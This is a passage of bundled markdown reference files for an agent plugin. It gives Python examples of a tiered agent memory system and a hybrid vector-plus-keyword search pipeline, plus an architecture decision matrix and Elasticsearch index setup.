metadata\n        }\n```\n\n### Knowledge Consolidation\n```python\nclass KnowledgeConsolidator:\n    def __init__(self, long_term_memory: LongTermMemory):\n        self.long_term = long_term_memory\n\n    def consolidate_similar_memories(self, similarity_threshold: float = 0.9):\n        \"\"\"Find and consolidate similar memories\"\"\"\n        # Get all memories\n        all_memories = self.long_term.vector_db.get()\n\n        # Find similar pairs\n        similar_pairs = self._find_similar_pairs(all_memories, similarity_threshold)\n\n        # Consolidate\n        for pair in similar_pairs:\n            self._consolidate_pair(pair)\n\n    def _find_similar_pairs(self, memories: List[dict], threshold: float) -> List[Tuple]:\n        \"\"\"Find pairs of similar memories\"\"\"\n        pairs = []\n\n        # Simplified - compare all pairs\n        for i in range(len(memories)):\n            for j in range(i + 1, len(memories)):\n                similarity = self._calculate_similarity(memories[i], memories[j])\n                if similarity > threshold:\n                    pairs.append((memories[i], memories[j]))\n\n        return pairs\n\n    def _calculate_similarity(self, memory1: dict, memory2: dict) -> float:\n        \"\"\"Calculate similarity between memories\"\"\"\n        # Simplified - use Jaccard similarity on content\n        set1 = set(memory1[\"content\"].split())\n        set2 = set(memory2[\"content\"].split())\n\n        intersection = len(set1 & set2)\n        union = len(set1 | set2)\n\n        return intersection / union if union > 0 else 0\n\n    def _consolidate_pair(self, pair: Tuple[dict, dict]):\n        \"\"\"Consolidate a pair of memories\"\"\"\n        memory1, memory2 = pair\n\n        # Create consolidated memory\n        consolidated_content = f\"{memory1['content']}\\n\\n{memory2['content']}\"\n        consolidated_metadata = {\n            \"consolidated\": True,\n            \"source_memories\": [memory1[\"id\"], memory2[\"id\"]],\n            \"consolidation_timestamp\": datetime.now().isoformat()\n        }\n\n        # Store consolidated memory\n        self.long_term.store_memory(\n            content=consolidated_content,\n            metadata=consolidated_metadata,\n            memory_type=\"consolidated\"\n        )\n\n        # Remove original memories (simplified)\n        # In practice, mark as superseded instead of deleting\n```\n\n## Tier 3: Entity Memory\n\n### Purpose\n- Persistent entity profiles\n- Relationship tracking\n- Entity evolution over time\n\n### Implementation\n```python\nclass EntityMemory:\n    def __init__(self, graph_db, embedding_func):\n        self.graph_db = graph_db\n        self.embedding_func = embedding_func\n        self.entity_cache = {}\n\n    def create_entity(\n        self,\n        entity_id: str,\n        name: str,\n        entity_type: str,\n        initial_properties: dict = None\n    ):\n        \"\"\"Create new entity in memory\"\"\"\n        entity = {\n            \"id\": entity_id,\n            \"name\": name,\n            \"type\": entity_type,\n            \"properties\": initial_properties or {},\n            \"first_seen\": datetime.now().isoformat(),\n            \"last_updated\": datetime.now().isoformat(),\n            \"interactions\": 0\n        }\n\n        # Store in graph database\n        self.graph_db.create_entity(entity)\n        self.entity_cache[entity_id] = entity\n\n        return entity\n\n    def update_entity(\n        self,\n        entity_id: str,\n        properties: dict = None,\n        new_name: str = None\n    ):\n        \"\"\"Update entity with new information\"\"\"\n        if entity_id not in self.entity_cache:\n            return None\n\n        entity = self.entity_cache[entity_id]\n\n        # Update properties\n        if properties:\n            entity[\"properties\"].update(properties)\n\n        # Update name\n        if new_name:\n            entity[\"name\"] = new_name\n\n        entity[\"last_updated\"] = datetime.now().isoformat()\n        entity[\"interactions\"] += 1\n\n        # Update in graph database\n        self.graph_db.update_entity(entity_id, entity)\n\n        return entity\n\n    def get_entity(self, entity_id: str) -> dict:\n        \"\"\"Get entity from memory\"\"\"\n        if entity_id in self.entity_cache:\n            return self.entity_cache[entity_id]\n\n        # Load from graph database\n        entity = self.graph_db.get_entity(entity_id)\n        if entity:\n            self.entity_cache[entity_id] = entity\n\n        return entity\n\n    def link_entities(\n        self,\n        entity1_id: str,\n        entity2_id: str,\n        relationship_type: str,\n        strength: float = 1.0\n    ):\n        \"\"\"Create relationship between entities\"\"\"\n        relationship = {\n            \"source\": entity1_id,\n            \"target\": entity2_id,\n            \"type\": relationship_type,\n            \"strength\": strength,\n            \"created\": datetime.now().isoformat()\n        }\n\n        self.graph_db.create_relationship(relationship)\n\n        return relationship\n\n    def get_entity_relationships(\n        self,\n        entity_id: str,\n        relationship_type: str = None\n    ) -> List[dict]:\n        \"\"\"Get all relationships for an entity\"\"\"\n        relationships = self.graph_db.get_relationships(entity_id)\n\n        if relationship_type:\n            relationships = [\n                r for r in relationships\n                if r[\"type\"] == relationship_type\n            ]\n\n        return relationships\n\n    def find_similar_entities(\n        self,\n        entity_id: str,\n        top_k: int = 5\n    ) -> List[Tuple[str, float]]:\n        \"\"\"Find similar entities based on properties and relationships\"\"\"\n        entity = self.get_entity(entity_id)\n        if not entity:\n            return []\n\n        # Get all other entities\n        all_entities = self.graph_db.get_all_entities()\n        similarities = []\n\n        for other_id, other_entity in all_entities.items():\n            if other_id == entity_id:\n                continue\n\n            similarity = self._calculate_entity_similarity(entity, other_entity)\n            similarities.append((other_id, similarity))\n\n        # Sort by similarity\n        similarities.sort(key=lambda x: x[1], reverse=True)\n\n        return similarities[:top_k]\n\n    def _calculate_entity_similarity(self, entity1: dict, entity2: dict) -> float:\n        \"\"\"Calculate similarity between two entities\"\"\"\n        # Consider type, properties, and relationships\n        type_match = 1.0 if entity1[\"type\"] == entity2[\"type\"] else 0.5\n\n        # Property similarity\n        common_props = set(entity1[\"properties\"].keys()) & set(entity2[\"properties\"].keys())\n        if common_props:\n            prop_similarity = sum(\n                self._calculate_value_similarity(\n                    entity1[\"properties\"][prop],\n                    entity2[\"properties\"][prop]\n                )\n                for prop in common_props\n            ) / len(common_props)\n        else:\n            prop_similarity = 0.0\n\n        # Relationship similarity\n        rel_similarity = self._calculate_relationship_similarity(entity1, entity2)\n\n        # Weighted combination\n        return (type_match * 0.3 + prop_similarity * 0.4 + rel_similarity * 0.3)\n\n    def _calculate_value_similarity(self, value1, value2) -> float:\n        \"\"\"Calculate similarity between two property values\"\"\"\n        if value1 == value2:\n            return 1.0\n\n        # For strings, use string similarity\n        if isinstance(value1, str) and isinstance(value2, str):\n            return self._string_similarity(value1, value2)\n\n        return 0.0\n\n    def _string_similarity(self, str1: str, str2: str) -> float:\n        \"\"\"Calculate string similarity (simplified)\"\"\"\n        set1 = set(str1.lower().split())\n        set2 = set(str2.lower().split())\n\n        intersection = len(set1 & set2)\n        union = len(set1 | set2)\n\n        return intersection / union if union > 0 else 0\n\n    def _calculate_relationship_similarity(self, entity1: dict, entity2: dict) -> float:\n        \"\"\"Calculate similarity based on relationships\"\"\"\n        # Simplified - count common relationships\n        # In practice, use more sophisticated methods\n        return 0.5\n```\n\n### Entity Evolution Tracking\n```python\nclass EntityEvolutionTracker:\n    def __init__(self, entity_memory: EntityMemory):\n        self.entity_memory = entity_memory\n        self.evolution_logs = {}\n\n    def log_entity_change(\n        self,\n        entity_id: str,\n        change_type: str,\n        old_value: any,\n        new_value: any,\n        context: str = None\n    ):\n        \"\"\"Log how an entity has changed over time\"\"\"\n        if entity_id not in self.evolution_logs:\n            self.evolution_logs[entity_id] = []\n\n        log_entry = {\n            \"timestamp\": datetime.now().isoformat(),\n            \"change_type\": change_type,\n            \"old_value\": old_value,\n            \"new_value\": new_value,\n            \"context\": context\n        }\n\n        self.evolution_logs[entity_id].append(log_entry)\n\n    def get_entity_evolution(self, entity_id: str) -> List[dict]:\n        \"\"\"Get evolution history of an entity\"\"\"\n        return self.evolution_logs.get(entity_id, [])\n\n    def analyze_evolution_trends(self, entity_id: str) -> dict:\n        \"\"\"Analyze evolution trends for an entity\"\"\"\n        evolution = self.get_entity_evolution(entity_id)\n\n        if not evolution:\n            return {}\n\n        trends = {\n            \"total_changes\": len(evolution),\n            \"change_frequency\": self._calculate_change_frequency(evolution),\n            \"property_changes\": self._count_property_changes(evolution),\n            \"trend_direction\": self._analyze_trend_direction(evolution)\n        }\n\n        return trends\n\n    def _calculate_change_frequency(self, evolution: List[dict]) -> float:\n        \"\"\"Calculate how often entity changes\"\"\"\n        if len(evolution) < 2:\n            return 0.0\n\n        # Calculate average time between changes\n        timestamps = [datetime.fromisoformat(e[\"timestamp\"]) for e in evolution]\n        intervals = [\n            (timestamps[i+1] - timestamps[i]).total_seconds()\n            for i in range(len(timestamps) - 1)\n        ]\n\n        return sum(intervals) / len(intervals) if intervals else 0\n\n    def _count_property_changes(self, evolution: List[dict]) -> dict:\n        \"\"\"Count changes by property\"\"\"\n        property_changes = {}\n\n        for entry in evolution:\n            prop = entry.get(\"property\", \"unknown\")\n            property_changes[prop] = property_changes.get(prop, 0) + 1\n\n        return property_changes\n\n    def _analyze_trend_direction(self, evolution: List[dict]) -> str:\n        \"\"\"Analyze overall trend direction\"\"\"\n        # Simplified - analyze if entity is becoming more/less active\n        # In practice, use more sophisticated trend analysis\n        return \"stable\"\n```\n\n## Integration Layer\n\n```python\nclass CrewAIMemorySystem:\n    def __init__(self, vector_db, graph_db, embedding_func):\n        self.short_term = ShortTermMemory()\n        self.long_term = LongTermMemory(vector_db, embedding_func)\n        self.entity_memory = EntityMemory(graph_db, embedding_func)\n        self.evolution_tracker = EntityEvolutionTracker(self.entity_memory)\n\n    def remember(self, content: str, memory_type: str = \"general\", metadata: dict = None):\n        \"\"\"Store memory in appropriate tier\"\"\"\n        # Decide which tier to use based on content and context\n        if self._is_conversational(content):\n            # Short-term memory\n            self.short_term.add_interaction(\n                metadata.get(\"user_input\", \"\"),\n                metadata.get(\"agent_response\", content)\n            )\n        else:\n            # Long-term memory\n            self.long_term.store_memory(content, metadata or {}, memory_type)\n\n            # Check for entities\n            if metadata and \"entities\" in metadata:\n                self._process_entities(metadata[\"entities\"])\n\n    def recall(self, query: str, memory_types: List[str] = None) -> dict:\n        \"\"\"Recall relevant memories from all tiers\"\"\"\n        results = {\n            \"short_term\": [],\n            \"long_term\": [],\n            \"entity\": []\n        }\n\n        # Query short-term memory\n        results[\"short_term\"] = self.short_term.get_relevant_context(query)\n\n        # Query long-term memory\n        results[\"long_term\"] = self.long_term.retrieve_memories(\n            query,\n            memory_types=memory_types\n        )\n\n        # Query entity memory\n        if \"entity\" in query.lower():\n            entity_id = self._extract_entity_id(query)\n            if entity_id:\n                entity = self.entity_memory.get_entity(entity_id)\n                if entity:\n                    results[\"entity\"] = {\n                        \"entity\": entity,\n                        \"relationships\": self.entity_memory.get_entity_relationships(entity_id)\n                    }\n\n        return results\n\n    def _is_conversational(self, content: str) -> bool:\n        \"\"\"Determine if content is conversational\"\"\"\n        conversational_indicators = [\"user\", \"agent\", \"question\", \"answer\"]\n        return any(indicator in content.lower() for indicator in conversational_indicators)\n\n    def _extract_entity_id(self, query: str) -> str:\n        \"\"\"Extract entity ID from query\"\"\"\n        # Simplified - look for entity mentions\n        # In practice, use NER\n        if \"entity:\" in query:\n            return query.split(\"entity:\")[1].strip().split()[0]\n        return None\n\n    def _process_entities(self, entities: List[dict]):\n        \"\"\"Process entities found in memory\"\"\"\n        for entity_data in entities:\n            entity_id = entity_data.get(\"id\")\n            if entity_id:\n                # Create or update entity\n                if not self.entity_memory.get_entity(entity_id):\n                    self.entity_memory.create_entity(\n                        entity_id=entity_id,\n                        name=entity_data.get(\"name\", \"\"),\n                        entity_type=entity_data.get(\"type\", \"unknown\"),\n                        initial_properties=entity_data.get(\"properties\", {})\n                    )\n```\n\n## Best Practices\n\n### Do's\nGOOD Use appropriate memory tier for content type\nGOOD Consolidate long-term memory regularly\nGOOD Track entity evolution over time\nGOOD Implement proper indexing for retrieval\nGOOD Consider memory decay for short-term context\nGOOD Use entity linking to avoid duplicates\n\n### Don'ts\nBAD Don't store everything in short-term memory\nBAD Don't forget to consolidate long-term memory\nBAD Don't ignore entity relationships\nBAD Don't use same representation for all memory types\nBAD Don't forget to clean up old short-term memories\nBAD Don't overcomplicate entity tracking\n\n### Memory Tier Selection\n\n| Content Type | Recommended Tier |\n|-------------|-----------------|\n| Recent conversation | Short-Term |\n| Important facts | Long-Term |\n| Entity profiles | Entity Memory |\n| Learnings | Long-Term |\n| Task state | Short-Term |\n| Relationships | Entity Memory |\n| Context | Short-Term |\n| Knowledge | Long-Term |\n",
        "plugins/sys-agents/skills/architecting-memory/references/custom-pipeline.md": "# Custom Hybrid Search Pipeline\n\n## Overview\n\nA custom pipeline provides maximum flexibility for hybrid search, allowing you to control every aspect of the search process, from indexing to reranking.\n\n## Architecture\n\n```\nQuery Input\n    \nQuery Processing (embedding, tokenization)\n    \nParallel Execution\n     Vector Search  Candidates (Top N)\n     Keyword Search  Candidates (Top N)\n    \nFusion (RRF/Linear/Cross-Encoder)\n    \nReranking (Optional)\n    \nResults (Top K)\n```\n\n## Implementation Patterns\n\n### 1. Async/Await Pattern\n\n```python\nimport asyncio\nfrom typing import List, Tuple, Dict, Any\nfrom dataclasses import dataclass\nfrom concurrent.futures import ThreadPoolExecutor\n\n@dataclass\nclass SearchResult:\n    doc_id: str\n    content: str\n    score: float\n    source: str  # 'vector', 'keyword', or 'hybrid'\n\nclass HybridSearchPipeline:\n    def __init__(\n        self,\n        vector_store,\n        keyword_store,\n        embedding_model,\n        reranker=None,\n        max_workers: int = 4\n    ):\n        self.vector_store = vector_store\n        self.keyword_store = keyword_store\n        self.embedding_model = embedding_model\n        self.reranker = reranker\n        self.executor = ThreadPoolExecutor(max_workers=max_workers)\n\n    async def search(\n        self,\n        query: str,\n        k: int = 10,\n        fusion_method: str = 'rrf',\n        alpha: float = 0.5,\n        use_reranking: bool = False,\n        num_candidates: int = 100\n    ) -> List[SearchResult]:\n        \"\"\"Main search pipeline.\"\"\"\n\n        # Process query\n        query_embedding = await self.get_embedding(query)\n\n        # Execute searches in parallel\n        vector_task = self.vector_search(\n            query_embedding,\n            num_candidates=num_candidates\n        )\n        keyword_task = self.keyword_search(query, num_candidates=num_candidates)\n\n        vector_results, keyword_results = await asyncio.gather(\n            vector_task, keyword_task\n        )\n\n        # Apply fusion\n        if fusion_method == 'rrf':\n            results = self.apply_rrf(vector_results, keyword_results, k=k)\n        elif fusion_method == 'linear':\n            results = self.apply_linear(vector_results, keyword_results, alpha=alpha, k=k)\n        else:\n            raise ValueError(f\"Unknown fusion method: {fusion_method}\")\n\n        # Apply reranking if requested\n        if use_reranking and results and self.reranker:\n            results = await self.rerank(results, query)\n\n        return results[:k]\n\n    async def get_embedding(self, query: str) -> List[float]:\n        \"\"\"Get query embedding asynchronously.\"\"\"\n        loop = asyncio.get_event_loop()\n        return await loop.run_in_executor(\n            self.executor,\n            self.embedding_model.encode,\n            query\n        )\n\n    async def vector_search(\n        self,\n        query_embedding: List[float],\n        num_candidates: int = 100\n    ) -> List[SearchResult]:\n        \"\"\"Perform vector similarity search.\"\"\"\n\n        def _search():\n            results = self.vector_store.search(\n                query_embedding,\n                k=num_candidates\n            )\n            return [\n                SearchResult(\n                    doc_id=doc_id,\n                    content=content,\n                    score=score,\n                    source='vector'\n                )\n                for doc_id, content, score in results\n            ]\n\n        loop = asyncio.get_event_loop()\n        return await loop.run_in_executor(self.executor, _search)\n\n    async def keyword_search(\n        self,\n        query: str,\n        num_candidates: int = 100\n    ) -> List[SearchResult]:\n        \"\"\"Perform keyword search.\"\"\"\n\n        def _search():\n            results = self.keyword_store.search(\n                query,\n                k=num_candidates\n            )\n            return [\n                SearchResult(\n                    doc_id=doc_id,\n                    content=content,\n                    score=score,\n                    source='keyword'\n                )\n                for doc_id, content, score in results\n            ]\n\n        loop = asyncio.get_event_loop()\n        return await loop.run_in_executor(self.executor, _search)\n\n    def apply_rrf(\n        self,\n        vector_results: List[SearchResult],\n        keyword_results: List[SearchResult],\n        k: int = 60\n    ) -> List[SearchResult]:\n        \"\"\"Apply Reciprocal Rank Fusion.\"\"\"\n\n        scores = {}\n\n        # Process vector results\n        for rank, result in enumerate(vector_results):\n            scores[result.doc_id] = scores.get(result.doc_id, 0) + 1.0 / (k + rank + 1)\n\n        # Process keyword results\n        for rank, result in enumerate(keyword_results):\n            scores[result.doc_id] = scores.get(result.doc_id, 0) + 1.0 / (k + rank + 1)\n\n        # Combine and sort\n        all_results = {r.doc_id: r for r in vector_results + keyword_results}\n\n        final_results = [\n            SearchResult(\n                doc_id=doc_id,\n                content=all_results[doc_id].content,\n                score=scores[doc_id],\n                source='hybrid'\n            )\n            for doc_id in sorted(scores.keys(), key=lambda x: scores[x], reverse=True)\n        ]\n\n        return final_results\n\n    def apply_linear(\n        self,\n        vector_results: List[SearchResult],\n        keyword_results: List[SearchResult],\n        alpha: float = 0.5,\n        k: int = 10\n    ) -> List[SearchResult]:\n        \"\"\"Apply linear combination.\"\"\"\n\n        # Create score maps\n        vector_scores = {r.doc_id: r.score for r in vector_results}\n        keyword_scores = {r.doc_id: r.score for r in keyword_results}\n\n        # Get all document IDs\n        all_ids = set(vector_scores.keys()) | set(keyword_scores.keys())\n\n        # Normalize scores (min-max normalization)\n        all_scores = list(vector_scores.values()) + list(keyword_scores.values())\n        min_score = min(all_scores) if all_scores else 0\n        max_score = max(all_scores) if all_scores else 1\n\n        if max_score > min_score:\n            vector_scores = {\n                k: (v - min_score) / (max_score - min_score)\n                for k, v in vector_scores.items()\n            }\n            keyword_scores = {\n                k: (v - min_score) / (max_score - min_score)\n                for k, v in keyword_scores.items()\n            }\n\n        # Combine scores\n        combined_scores = {}\n        for doc_id in all_ids:\n            v_score = vector_scores.get(doc_id, 0)\n            k_score = keyword_scores.get(doc_id, 0)\n            combined_scores[doc_id] = alpha * v_score + (1 - alpha) * k_score\n\n        # Sort and return\n        all_results = {r.doc_id: r for r in vector_results + keyword_results}\n\n        sorted_ids = sorted(\n            combined_scores.keys(),\n            key=lambda x: combined_scores[x],\n            reverse=True\n        )\n\n        return [\n            SearchResult(\n                doc_id=doc_id,\n                content=all_results[doc_id].content,\n                score=combined_scores[doc_id],\n                source='hybrid'\n            )\n            for doc_id in sorted_ids[:k]\n        ]\n\n    async def rerank(\n        self,\n        results: List[SearchResult],\n        query: str\n    ) -> List[SearchResult]:\n        \"\"\"Rerank results using cross-encoder.\"\"\"\n\n        if not self.reranker:\n            return results\n\n        # Prepare query-document pairs\n        pairs = [(query, result.content) for result in results]\n\n        # Get reranking scores\n        def _rerank():\n            return self.reranker.predict(pairs)\n\n        loop = asyncio.get_event_loop()\n        rerank_scores = await loop.run_in_executor(self.executor, _rerank)\n\n        # Update results with rerank scores\n        for result, score in zip(results, rerank_scores):\n            result.score = score\n            result.source = 'reranked'\n\n        # Sort by rerank score\n        return sorted(results, key=lambda x: x.score, reverse=True)\n\n    async def batch_search(\n        self,\n        queries: List[str],\n        **kwargs\n    ) -> List[List[SearchResult]]:\n        \"\"\"Search multiple queries in parallel.\"\"\"\n\n        tasks = [\n            self.search(query, **kwargs)\n            for query in queries\n        ]\n\n        return await asyncio.gather(*tasks)\n```\n\n### 2. Streaming Pattern\n\n```python\nimport asyncio\nfrom typing import AsyncIterator\n\nclass StreamingHybridSearch:\n    def __init__(self, pipeline: HybridSearchPipeline):\n        self.pipeline = pipeline\n\n    async def search_stream(\n        self,\n        query: str,\n        **kwargs\n    ) -> AsyncIterator[SearchResult]:\n        \"\"\"Stream search results as they become available.\"\"\"\n\n        # Start vector search\n        vector_task = asyncio.create_task(\n            self.pipeline.vector_search(query)\n        )\n\n        # Start keyword search\n        keyword_task = asyncio.create_task(\n            self.pipeline.keyword_search(query)\n        )\n\n        # Wait for both to complete\n        vector_results, keyword_results = await asyncio.gather(\n            vector_task, keyword_task\n        )\n\n        # Apply fusion\n        fused_results = self.pipeline.apply_rrf(vector_results, keyword_results)\n\n        # Yield results one by one\n        for result in fused_results:\n            yield result\n            await asyncio.sleep(0)  # Allow other tasks to run\n\n# Usage\nasync def main():\n    streaming_search = StreamingHybridSearch(pipeline)\n\n    async for result in streaming_search.search_stream(\"my query\"):\n        print(f\"Result: {result.content} (score: {result.score})\")\n```\n\n### 3. Caching Pattern\n\n```python\nfrom functools import lru_cache\nimport hashlib\nimport json\n\nclass CachedHybridSearch:\n    def __init__(self, pipeline: HybridSearchPipeline):\n        self.pipeline = pipeline\n        self.cache = {}\n\n    def _get_cache_key(self, query: str, **kwargs) -> str:\n        \"\"\"Generate cache key from query and parameters.\"\"\"\n        key_data = {\n            'query': query,\n            **kwargs\n        }\n        return hashlib.md5(json.dumps(key_data, sort_keys=True).encode()).hexdigest()\n\n    @lru_cache(maxsize=1000)\n    async def search(\n        self,\n        query: str,\n        k: int = 10,\n        fusion_method: str = 'rrf',\n        alpha: float = 0.5,\n        use_reranking: bool = False,\n        num_candidates: int = 100\n    ) -> List[SearchResult]:\n        \"\"\"Search with caching.\"\"\"\n\n        cache_key = self._get_cache_key(\n            query, k=k, fusion_method=fusion_method,\n            alpha=alpha, use_reranking=use_reranking,\n            num_candidates=num_candidates\n        )\n\n        if cache_key in self.cache:\n            return self.cache[cache_key]\n\n        results = await self.pipeline.search(\n            query=query,\n            k=k,\n            fusion_method=fusion_method,\n            alpha=alpha,\n            use_reranking=use_reranking,\n            num_candidates=num_candidates\n        )\n\n        self.cache[cache_key] = results\n        return results\n```\n\n### 4. Configurable Fusion\n\n```python\nfrom abc import ABC, abstractmethod\nfrom typing import List\n\nclass FusionMethod(ABC):\n    @abstractmethod\n    def fuse(\n        self,\n        vector_results: List[SearchResult],\n        keyword_results: List[SearchResult],\n        **kwargs\n    ) -> List[SearchResult]:\n        pass\n\nclass RRFusion(FusionMethod):\n    def fuse(\n        self,\n        vector_results: List[SearchResult],\n        keyword_results: List[SearchResult],\n        k: int = 60\n    ) -> List[SearchResult]:\n        scores = {}\n\n        for rank, result in enumerate(vector_results):\n            scores[result.doc_id] = scores.get(result.doc_id, 0) + 1.0 / (k + rank + 1)\n\n        for rank, result in enumerate(keyword_results):\n            scores[result.doc_id] = scores.get(result.doc_id, 0) + 1.0 / (k + rank + 1)\n\n        all_results = {r.doc_id: r for r in vector_results + keyword_results}\n\n        return sorted(\n            [\n                SearchResult(\n                    doc_id=doc_id,\n                    content=all_results[doc_id].content,\n                    score=scores[doc_id],\n                    source='hybrid'\n                )\n                for doc_id in sorted(scores.keys(), key=lambda x: scores[x], reverse=True)\n            ],\n            key=lambda x: x.score,\n            reverse=True\n        )\n\nclass LinearFusion(FusionMethod):\n    def fuse(\n        self,\n        vector_results: List[SearchResult],\n        keyword_results: List[SearchResult],\n        alpha: float = 0.5\n    ) -> List[SearchResult]:\n        # Implementation from earlier\n        pass\n\nclass ConfigurableHybridSearch:\n    def __init__(self, vector_store, keyword_store, embedding_model):\n        self.vector_store = vector_store\n        self.keyword_store = keyword_store\n        self.embedding_model = embedding_model\n        self.fusion_methods = {\n            'rrf': RRFusion(),\n            'linear': LinearFusion()\n        }\n\n    async def search(\n        self,\n        query: str,\n        fusion_method: str = 'rrf',\n        **kwargs\n    ) -> List[SearchResult]:\n        \"\"\"Search with configurable fusion.\"\"\"\n\n        fusion = self.fusion_methods.get(fusion_method)\n        if not fusion:\n            raise ValueError(f\"Unknown fusion method: {fusion_method}\")\n\n        # Get query embedding\n        query_embedding = await self.get_embedding(query)\n\n        # Execute searches\n        vector_results = await self.vector_search(query_embedding)\n        keyword_results = await self.keyword_search(query)\n\n        # Apply fusion\n        return fusion.fuse(vector_results, keyword_results, **kwargs)\n```\n\n## Production Considerations\n\n### 1. Error Handling\n\n```python\nasync def search_with_retry(\n    query: str,\n    max_retries: int = 3,\n    backoff_factor: float = 1.5\n):\n    \"\"\"Search with exponential backoff retry.\"\"\"\n\n    for attempt in range(max_retries):\n        try:\n            return await pipeline.search(query)\n        except Exception as e:\n            if attempt == max_retries - 1:\n                raise\n\n            wait_time = backoff_factor ** attempt\n            await asyncio.sleep(wait_time)\n\n    return []\n```\n\n### 2. Monitoring\n\n```python\nimport time\nfrom contextlib import asynccontextmanager\n\n@asynccontextmanager\nasync def measure_search_time():\n    \"\"\"Measure search execution time.\"\"\"\n    start = time.time()\n    try:\n        yield\n    finally:\n        duration = time.time() - start\n        print(f\"Search took {duration:.3f}s\")\n\n# Usage\nasync with measure_search_time():\n    results = await pipeline.search(query)\n```\n\n### 3. Load Balancing\n\n```python\nclass LoadBalancedHybridSearch:\n    def __init__(self, pipelines: List[HybridSearchPipeline]):\n        self.pipelines = pipelines\n        self.current = 0\n\n    async def search(self, query: str, **kwargs):\n        \"\"\"Round-robin load balancing.\"\"\"\n\n        pipeline = self.pipelines[self.current]\n        self.current = (self.current + 1) % len(self.pipelines)\n\n        return await pipeline.search(query, **kwargs)\n```\n\n### 4. Circuit Breaker\n\n```python\nclass CircuitBreaker:\n    def __init__(self, failure_threshold: int = 5, timeout: float = 60):\n        self.failure_threshold = failure_threshold\n        self.timeout = timeout\n        self.failure_count = 0\n        self.last_failure_time = None\n        self.state = 'CLOSED'  # CLOSED, OPEN, HALF_OPEN\n\n    async def call(self, func, *args, **kwargs):\n        \"\"\"Call function with circuit breaker protection.\"\"\"\n\n        if self.state == 'OPEN':\n            if time.time() - self.last_failure_time < self.timeout:\n                raise Exception(\"Circuit breaker is OPEN\")\n            else:\n                self.state = 'HALF_OPEN'\n\n        try:\n            result = await func(*args, **kwargs)\n            if self.state == 'HALF_OPEN':\n                self.state = 'CLOSED'\n                self.failure_count = 0\n            return result\n        except Exception as e:\n            self.failure_count += 1\n            self.last_failure_time = time.time()\n\n            if self.failure_count >= self.failure_threshold:\n                self.state = 'OPEN'\n\n            raise\n```\n\n## Complete Example\n\n```python\nasync def main():\n    # Initialize stores (implement your own)\n    vector_store = MyVectorStore()\n    keyword_store = MyKeywordStore()\n    embedding_model = MyEmbeddingModel()\n    reranker = MyReranker()\n\n    # Create pipeline\n    pipeline = HybridSearchPipeline(\n        vector_store=vector_store,\n        keyword_store=keyword_store,\n        embedding_model=embedding_model,\n        reranker=reranker\n    )\n\n    # Perform search\n    results = await pipeline.search(\n        query=\"machine learning algorithms\",\n        k=10,\n        fusion_method='rrf',\n        use_reranking=True,\n        num_candidates=100\n    )\n\n    # Print results\n    for result in results:\n        print(f\"Score: {result.score:.4f}, Source: {result.source}\")\n        print(f\"Content: {result.content[:200]}...\")\n        print(\"-\" * 80)\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\n## Best Practices\n\n1. **Use async/await** - Improve throughput with concurrent execution\n2. **Implement caching** - Cache embeddings and frequent queries\n3. **Add monitoring** - Track latency, throughput, and error rates\n4. **Handle errors gracefully** - Implement retry and circuit breaker patterns\n5. **Optimize for your use case** - Tune parameters based on evaluation\n6. **Use appropriate data structures** - Optimize for your specific needs\n7. **Profile performance** - Identify bottlenecks and optimize\n8. **Test with real data** - Validate on actual queries and documents\n9. **Monitor quality metrics** - Track recall, precision, and NDCG\n10. **A/B test in production** - Measure real-world performance\n",
        "plugins/sys-agents/skills/architecting-memory/references/decision-matrix.md": "# Architecture Selection Guide\n\n## Decision Matrix\n\n| Use Case | Vector RAG | GraphRAG | Temporal KG |\n|----------|-----------|----------|-------------|\n| **Document Search** | GOOD Best | WARNING Overkill | BAD Unnecessary |\n| **Q&A Systems** | GOOD Good | GOOD Better | WARNING Complex |\n| **Entity Relationships** | BAD No | GOOD Yes | GOOD Yes |\n| **Multi-hop Reasoning** | BAD Limited | GOOD Yes | GOOD Yes |\n| **Time-sensitive** | BAD No | WARNING Limited | GOOD Best |\n| **Simple Implementation** | GOOD Easy | WARNING Medium | BAD Hard |\n\n## Selection Criteria\n\n**Choose Vector RAG when:**\n- Primary need is semantic search\n- Simple document retrieval\n- Minimal relationship requirements\n- Quick implementation needed\n\n**Choose GraphRAG when:**\n- Need to model relationships\n- Multi-hop reasoning required\n- Entity extraction is feasible\n- Complex queries anticipated\n\n**Choose Temporal KG when:**\n- Time is critical dimension\n- Event sequences matter\n- Historical analysis needed\n- Predictive modeling required\n",
        "plugins/sys-agents/skills/architecting-memory/references/elasticsearch-hybrid.md": "# Elasticsearch Hybrid Search\n\n## Overview\n\nElasticsearch provides native support for hybrid search through dense vector fields and traditional full-text search, enabling efficient hybrid retrieval in a single query.\n\n## Index Setup\n\n### 1. Create Index with Vector Field\n\n```json\nPUT documents\n{\n  \"settings\": {\n    \"index\": {\n      \"number_of_shards\": 1,\n      \"number_of_replicas\": 0,\n      \"knn\": {\n        \"algo_param\": {\n          \"ef_construction\": 100,\n          \"m\": 16\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"id\": {\n        \"type\": \"keyword\"\n      },\n      \"content\": {\n        \"type\": \"text\"\n      },\n      \"embedding\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 1536,\n        \"index\": true,\n        \"similarity\": \"cosine\"\n      },\n      \"metadata\": {\n        \"type\": \"object\"\n      }\n    }\n  }\n}\n```\n\n### 2. Configure kNN Search\n\n```json\nPUT documents\n{\n  \"settings\": {\n    \"index\": {\n      \"knn\": true,\n      \"knn.algo_param\": {\n        \"ef_construction\": 128,\n        \"m\": 16\n      }\n    }\n  }\n}\n```\n\n## Indexing Documents\n\n### Bulk Index with Embeddings\n\n```python\nfrom elasticsearch import Elasticsearch\nfrom sentence_transformers import SentenceTransformer\n\n# Initialize Elasticsearch\nes = Elasticsearch(\"http://localhost:9200\")\n\n# Load embedding model\nmodel = SentenceTransformer('all-MiniLM-L6-v2')\n\n# Sample documents\ndocuments = [\n    {\"id\": \"1\", \"content\": \"Elasticsearch is a distributed search engine\"},\n    {\"id\": \"2\", \"content\": \"PostgreSQL is a relational database\"},\n    {\"id\": \"3\", \"content\": \"MongoDB is a NoSQL database\"}\n]\n\n# Generate embeddings\nfor doc in documents:\n    embedding = model.encode(doc[\"content\"])\n    doc[\"embedding\"] = embedding.tolist()\n\n# Bulk index\noperations = []\nfor doc in documents:\n    operations.append({\"index\": {\"_index\": \"documents\", \"_id\": doc[\"id\"]}})\n    operations.append(doc)\n\nes.bulk(operations=operations)\nes.indices.refresh(index=\"documents\")\n```\n\n## Hybrid Search Queries\n\n### 1. Basic Hybrid Search (Bool Query)\n\n```json\nGET 